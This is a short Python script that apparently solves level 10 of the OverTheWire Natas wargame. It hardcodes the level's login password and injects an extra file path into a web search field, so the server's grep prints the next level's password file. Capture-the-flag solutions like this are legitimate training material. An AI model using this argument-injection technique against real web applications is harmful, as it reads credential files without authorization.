#!/usr/bin/python3

import requests
import re
import string

password="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url="http://natas10.natas.labs.overthewire.org/"
pattern = "/etc/natas_webpass/natas11:.*"
for char in string.ascii_lowercase:
	r = requests.get(url=url, auth=("natas10",password), params={
	"needle":f"{char} /etc/natas_webpass/natas11",
	"submit":"search"
	})
	if "/etc/natas_webpass/natas11" in r.text:
		print(re.findall(r"/etc/natas_webpass/natas11:.*", r.text)[0])
		break
